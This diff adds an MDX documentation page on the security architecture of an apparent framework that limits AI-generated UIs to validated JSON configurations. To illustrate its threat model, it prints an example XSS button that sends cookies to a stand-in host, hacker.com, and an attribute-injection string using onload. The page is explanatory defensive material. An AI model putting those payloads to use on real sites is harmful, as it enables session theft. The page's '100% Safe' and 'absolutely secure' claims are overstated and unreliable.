@@ -1,0 +1,79 @@
+import { DocHero } from "@/components/mdx/DocHero";
+import { HoverLink } from "@/components/mdx/HoverLink";
+import { DocsPagination } from "@/components/mdx/DocsPagination";
+import { Comparison } from "@/components/mdx/Comparison";
+import { Alert } from "@/components/mdx/Alert";
+
+<DocHero 
+  title="Security Architecture" 
+  subtitle="How the OpenUI Adaptive Standard guarantees that AI-generated UIs are deterministic, bounded, and absolutely secure from injections." 
+/>
+
+## Overview
+
+One of the greatest challenges of letting Large Language Models generate User Interfaces is security. If an LLM is allowed to generate raw HTML, CSS, or React code, the host application is immediately vulnerable to Cross-Site Scripting (XSS), malicious script injections, and broken DOM structures.
+
+OUAS solves this by **never allowing the AI to generate code**. Instead, the AI generates bounded JSON configurations that map to pre-compiled, strictly typed React components.
+
+## The Threat Model
+
+<Comparison 
+  leftTitle="Unsafe: Raw Code Generation"
+  rightTitle="Safe: OUAS JSON Configuration"
+  leftContent={<>
+    <div className="prose prose-sm dark:prose-invert">
+      <p>If an LLM hallucinates or is prompted maliciously, it can inject arbitrary scripts into your DOM:</p>
+      <pre><code>{`<button onClick="fetch('http://hacker.com?cookie='+document.cookie)">
+  Click Me
+</button>`}</code></pre>
+      <p className="text-danger font-semibold mt-2">Vulnerable to XSS</p>
+    </div>
+  </>}
+  rightContent={<>
+    <div className="prose prose-sm dark:prose-invert">
+      <p>In OUAS, the LLM can only select an ID and provide primitive props (strings, numbers, booleans):</p>
+      <pre><code>{`{
+  "target_id": "payment-button",
+  "props": {
+    "label": "Click Me"
+  }
+}`}</code></pre>
+      <p className="text-success font-semibold mt-2">100% Safe (Props are escaped by React)</p>
+    </div>
+  </>}
+/>
+
+## Security Guarantees
+
+### 1. No Code Execution
+The AI Agent operates entirely out-of-band. It communicates with the host application strictly via REST API or WebSocket using JSON payloads. The host application's `@ouas/renderer` receives this JSON and passes the data as React props. React natively escapes all strings passed as props, neutralizing any XSS attempts.
+
+### 2. The Component Firewall
+The AI cannot invent new components. If the AI attempts to render `target_id: "malicious-iframe"`, the `@ouas/renderer` will intercept it. Because `"malicious-iframe"` is not explicitly registered in the <HoverLink href="/docs/sdk-react" title="React SDK Reference" description="The internal registry tracking all exposed UI components.">ComponentRegistry</HoverLink> via the <HoverLink href="/docs/sdk-react" title="React SDK Reference" description="Learn how to use the withOUAS HOC to register components.">withOUAS</HoverLink> wrapper, the renderer will drop the request entirely.
+
+<Alert 
+  type="warning" 
+  title="Strict Component Mapping" 
+  content="The renderer does not use dangerouslySetInnerHTML or eval(). It uses a strict Dictionary lookup to match the JSON ID to an actual imported React Function Component." 
+/>
+
+### 3. Prop Schema Enforcement
+Even if the AI correctly targets an allowed component (e.g., `user-profile`), it cannot pass arbitrary props. 
+
+When you define a schema using <HoverLink href="/docs/sdk-react" title="React SDK Reference" description="Learn how to use the withOUAS HOC to register components.">withOUAS</HoverLink>, you define exactly what the AI can touch:
+
+```tsx
+export const UserProfile = withOUAS(UserProfileBase, {
+  id: 'user-profile',
+  schema: {
+    theme: { type: 'string', enum: ['light', 'dark'] } // AI can ONLY choose 'light' or 'dark'
+  }
+});
+```
+
+If the AI attempts a Prompt Injection by passing `theme: "dark\" onload=\"alert(1)\""`, the OUAS <HoverLink href="/docs/validation" title="Validation Pipeline" description="The strict firewall that validates AI outputs against the manifest.">Validation Pipeline</HoverLink> will instantly reject the JSON payload because it violates the strict `enum` constraint before it ever reaches the React tree.
+
+<DocsPagination 
+  prev={{ title: "Renderer Reference", href: "/docs/renderer", description: "Learn how the renderer maps JSON to React" }}
+  next={{ title: "Versioning", href: "/docs/versioning", description: "Learn how to version component manifests" }}
+/>
